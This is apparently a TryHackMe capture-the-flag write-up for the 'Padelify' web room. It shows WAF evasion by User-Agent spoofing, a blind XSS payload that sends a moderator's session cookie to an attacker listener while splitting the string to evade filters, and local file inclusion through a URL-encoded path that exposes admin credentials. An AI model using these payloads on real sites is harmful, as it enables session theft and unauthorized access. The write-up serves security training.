# 🛠️ TryHackMe: Padelify  
**Difficulty:** 🟠 Medium  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/padelify)

---

> **Disclaimer:**  
> This write-up is for educational and professional demonstration purposes only.  
> All testing was performed in a controlled, authorized environment (TryHackMe).  
> No techniques described here were used against real-world systems.

---

## About This Write-Up
This document is part of my offensive security portfolio.  
My goal is to present structured, professional case studies that demonstrate practical penetration testing skills, clear reporting, and a real-world methodology.

These write-ups are meant to demonstrate practical offensive security skills relevant to junior pentesting, red teaming, and application security roles.

---

## 🧠 Summary
**Padelify** is a web exploitation challenge focused on **WAF bypass techniques**, **blind XSS exploitation**, and **local file inclusion (LFI)**.  
The attack chain involves bypassing a **signature-based Web Application Firewall**, stealing a **moderator session cookie via blind XSS**, and abusing a vulnerable `page` parameter to read sensitive configuration files.

**Key themes:**
- Web Application Firewall evasion  
- Blind Cross-Site Scripting (XSS)  
- Cookie exfiltration  
- Parameter fuzzing  
- Local File Inclusion (LFI)  
- URL encoding bypass techniques  

---

## 🧰 Tools & Techniques

| Tool / Technique | Purpose |
|------------------|---------|
| **nmap** | Port scanning & service discovery |
| **Gobuster** | Directory & parameter fuzzing |
| **curl** | Manual HTTP testing |
| **Python HTTP server** | XSS exfiltration listener |
| **CyberChef** | URL encoding |
| **WAF evasion** | User-Agent spoofing, string splitting |
| **Blind XSS** | Stored payload execution |

---

## 🚀 Attack Path

### 1. Reconnaissance with nmap

```bash
nmap -Pn 10.67.171.240
```
| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

#### Analysis
**The scan revealed two open services:**
- **Port 22 (SSH)** – Remote administration service
- **Port 80 (HTTP)** – Web application

Since the challenge is web-focused, I proceeded to analyze the HTTP service.

#### Web Application Enumeration
**Navigating to:**
```
http://10.67.171.240:80
```
**Revealed:**
- A registration page
- A login page

#### Registration Flow
New account creation required **moderator approval** before activation.

**This indicates:**
- Manual user verification
- Potential **privileged role**(moderator) managing accounts
- Possible attack surface for **privilege escalation**

#### Discovery of Weak Credentials
**During testing, I attempted to log in using:**
```text
Username: test
Password: test
```
The login was successful.

#### Security Implications
**This behavior suggests:**
- A leftover development account
- Weak credential policy
- Possible misconfiguration

**In real-world environments, such accounts are dangerous because:**
- They are often forgotten
- They usually have elevated privileges
- They bypass MFA or logging

**However:**
This account was not required to complete the challenge, so I continued following the intended exploitation path.

---

### 2. Initial Web Access & WAF Detection
To better understand how the web server handles requests, I sent a manual HTTP request using `curl`.
```
curl 10.67.171.240
```
**Server response:**
```html
403 FORBIDDEN  
Web Application Firewall is ACTIVE
```
**Analysis**
The server immediately returned a 403 Forbidden response.

**This confirms that:**
- Direct requests are being actively filtered
- A Web Application Firewall (WAF) is deployed

**The error message explicitly states:**
"Web Application Firewall is ACTIVE"

**This strongly indicates:**
- Request inspection is enabled
- Certain patterns and headers are being analyzed
- Automated tools are likely blocked by default

---

### 3. WAF Bypass (User-Agent Spoofing)
After confirming the presence of a Web Application Firewall,
I attempted directory enumeration using Gobuster.

However, the default Gobuster requests were **blocked immediately.**

**This indicated:**
- The WAF inspects HTTP headers
- Specifically the User-Agent
- Blocking known scanner signatures

#### Understanding the Block

**Most automated tools (Gobuster, Nikto, Dirb) use:**
-Static User-Agent strings
- Easily fingerprinted patterns
- Known signatures stored in WAF rulesets

**Example:**
```
User-Agent: gobuster/3.6
```
This makes detection trivial.

#### Bypassing the WAF

To evade detection, I spoofed a legitimate browser User-Agent:
```bash
gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a Mozilla/5.0
```
**Results:**
| Path           | Status | Notes         |
| -------------- | ------ | ------------- |
| /config        | 301    | Interesting   |
| /logs          | 301    | Contains logs |
| /css           | 301    | Bootstrap     |
| /js            | 301    | Bootstrap     |
| /index.php     | 200    | Homepage      |
| /php.ini       | 403    | Blocked       |
| /server-status | 403    | Blocked       |

#### Analysis

**We now know:**
- WAF allows browser-like traffic
- Automated tools are blocked by signature
- /logs is publicly accessible
- /config exists but is restricted

**This confirms:**
- The WAF uses static pattern matching instead of behavioral analysis.

#### Security Impact

**In real environments this means:**
- Attackers can bypass protection easily
- Enumeration becomes trivial
- Sensitive directories get exposed
- WAF gives false sense of security

---

### 4. Log File Analysis

```lua
/logs/error.log
```
**Findings:**
- Possible encoded or obfuscated XSS payload detected
- Failed to parse admin_info in: `/var/www/html/config/app.conf`

**Conclusion:**
- XSS attempts already exist
- Sensitive config file exists
- WAF blocks direct access

---

### 5. Blind XSS Discovery
Based on the log file findings, I suspected a stored XSS vulnerability.
To confirm this, I injected a simple HTML payload and monitored my own server.

```html
<img src="http://10.67.101.111:8000" />
```
```bash
python3 -m http.server 8000
```
**Incoming traffic:**
```sql
GET / HTTP/1.1
```

**This proves:**
- My input was stored in the application
- A privileged user (moderator/admin) viewed the page
- Their browser executed my payload
- The request reached my server

**This is the definition of:**
- Blind XSS
Why is this dangerous?

**Blind XSS is extremely dangerous because:**
- The attacker never sees the page
- Payloads execute in high-privilege contexts

**Can lead to:**
- Session hijacking
- Account takeover
- CSRF
- Internal network attacks

---

### 6. WAF Evasion – Cookie Exfiltration
After confirming blind XSS, the next goal was to steal the moderator session cookie.

#### Step 1: Identify WAF filtering behavior

**I first tested if JavaScript itself was blocked:**
```
<script>alert(1)</script>
```
✔️ Allowed

**Next, I tested:**
```
document.cookie
```
❌ Blocked

#### Conclusion

**The WAF does not block:**
- <script> tags

**But does block:**
- The literal string document.cookie

This confirms a **signature-based WAF.**

#### Step 2: Bypass using string concatenation

**To evade detection, I used:**
```html
document["coo"+"kie"]
```

**Why this works:**
- Browser concatenates → `cookie`
- WAF scans raw input
- Does NOT see "`cookie`"
- Filter bypassed


#### Step 3: Final exfiltration payload
```html
<script> var i=new Image(); i.src="http://10.67.101.111:9001/?c="+document["coo"+"kie"] </script>
```
#### Step 4: Listener setup
```bash
python3 -m http.server 9001
```
#### Step 5: Cookie captured
```ini
PHPSESSID=e1omj7ther5rnh0g5ks70vjn84
```

**This attack works because:**
1. Payload is stored server-side
2. Moderator loads the page
3. JavaScript executes in their browser
4. Cookie is appended to URL
5. Browser sends request to attacker
6. Session token is stolen

#### Impact

**With this cookie:**
- I fully impersonated the moderator
- No password required
- Session hijacking achieved

**Privilege escalation successful!**

---

### 7. Moderator Access
I replaced my own session cookie with the stolen moderator cookie.
After refreshing the page, I was logged in as the moderator account.

**What is the flag value after logging in as a moderator?**
```text
THM{REDACTED}
```

**Impact:**
- Successful session hijacking
- Privilege escalation
- Full access to moderator features

---

### 8. Parameter Fuzzing – Local File Inclusion (LFI)
From earlier log analysis, we already knew:
- `/var/www/html/config/app.conf` contains admin credentials

**However:**
- Direct access was blocked by the WAF
- Manual browsing was not possible

#### Step 1: Discover dynamic file loading

**While browsing, I found:**
```bash
/live.php?page=match.php
```

**This strongly suggested:**
- The application includes files dynamically
- User input directly controls file paths
- High probability of LFI

#### Step 2: Fuzzing the page parameter

**To enumerate accessible files:**
```bash
gobuster fuzz -u http://10.67.171.240/live.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -a Mozilla/5.0 --exclude-length 1907
```
**Why exclude-length 1907?**
- All invalid pages returned exactly 1907 bytes
- Filtering removes noise
- Only meaningful responses remain

#### Step 3: Fuzzing results
| Parameter Value        | Status | Length | Meaning                     |
| ---------------------- | ------ | ------ | --------------------------- |
| config                 | 200    | 1835   | Config directory accessible |
| css                    | 200    | 1835   | Frontend assets             |
| js                     | 200    | 1835   | JavaScript files            |
| logs                   | 200    | 1835   | Log directory               |
| index.php              | 200    | 5688   | Homepage                    |
| php.ini                | 403    | 2872   | Restricted                  |
| Documents and Settings | 400    | 321    | Windows artifact            |
| Program Files          | 400    | 321    | Windows artifact            |
| reports list           | 400    | 321    | Invalid path                |

#### Interpretation

**This confirms:**
- Input is not sanitized
- Server tries to load whatever we supply
- Classic LFI vulnerability

#### Step 4: Attempt to read sensitive config

**Knowing the file location:**
```html
/var/www/html/config/app.conf
```
**I tried:**
```bash
http://10.67.171.240/live.php?page=/config/app.conf
```
❌ Blocked by WAF

#### Why it failed

**The WAF blocks:**
- `/config/`
- `.conf`
**Based on:**
- Static string detection
- Simple blacklist rules

---

### 9. URL Encoding WAF Bypass

**I used CyberChef to URL-encode the blocked path:**
```arduino
/config/app.conf
```
**Encoded version:**
```bash
%2Fconfig%2Fapp%2Econf
```
**When Requesting:**
```bash
/live.php?page=%2Fconfig%2Fapp%2Econf
```

**The file was successfully loaded and revealed admin credentials:**
```ini
admin_info = "bL}8,S9W1o44"
```

**Why this works?**
- WAF inspects RAW request
- Does not decode URL
- Backend decodes internally
- Filter bypassed

**This creates a parsing discrepancy:**
- Security layer sees: `%2Fconfig%2Fapp%2Econf`
- Application sees: `/config/app.conf`

---

### 10. Admin Access

I navigated to the login page and authenticated using:

- **Username:** admin  
- **Password:** bL}8,S9W1o44  

After logging in, I successfully retrieved the final flag.

**What is the flag value after logging in as admin?**
```text
THM{REDACTED}
```

---

## 🏁 Flags found

| 🏷️ Flag | Technique | Impact | Value |
|----------|------------|--------|-------|
| Moderator Flag | Blind XSS + Session Hijacking | Account takeover → Moderator privileges | `THM{REDACTED}` |
| Admin Flag | LFI + WAF Bypass (URL Encoding) | Credential disclosure → Full admin access | `THM{REDACTED}` |

---

## Room links

📸 [screenshots](../../challenges/thm-padelify/screenshots.md)

🔗 [TryHackMe - Padelify](https://tryhackme.com/room/padelify)

---

## 💭 Reflection

This room demonstrated how **simple, signature-based Web Application Firewalls** can be systematically bypassed when attackers understand how detection mechanisms operate.  
Instead of relying on complex zero-day exploits, the challenge focused on abusing **logic flaws, weak filtering, and trust assumptions**:

- **User-Agent spoofing** allowed automated tools to bypass naive bot detection.
- **String concatenation** defeated keyword-based filters targeting `document.cookie`.
- **URL encoding** exploited a decoding mismatch between the WAF and backend application.
- **Blind XSS** highlighted how stored payloads can silently compromise privileged users.
- **Local File Inclusion (LFI)** showed how insufficient input validation leads to direct credential disclosure.

What made this room powerful was not a single vulnerability, but **how multiple medium-risk issues chained together** to achieve full system compromise.

---

### Key Takeaways

- **WAFs ≠ security**  
  Signature-based filtering provides a false sense of protection and is easily bypassed.

- **Blind XSS is extremely dangerous**  
  Attackers do not need direct feedback — just one privileged user loading the payload is enough.

- **Encoding techniques defeat filters**  
  Security controls must normalize input before inspection.

- **Session hijacking equals instant privilege escalation**  
  Stealing a session cookie bypasses authentication entirely.

- **Parameter fuzzing is powerful**  
  Hidden endpoints and misconfigurations are often overlooked attack vectors.

---

### Lessons Learned

- **Always test what is actually filtered**  
  Never assume protections work — verify them.

- **Break payloads apart**  
  Splitting keywords easily bypasses static detection engines.

- **Combine vulnerabilities**  
  Real-world attacks rarely rely on a single bug.

- **Log files leak secrets**  
  Debug data often contains sensitive paths and credentials.

- **Defense-in-depth matters**  
  One failed control should never lead to full compromise.
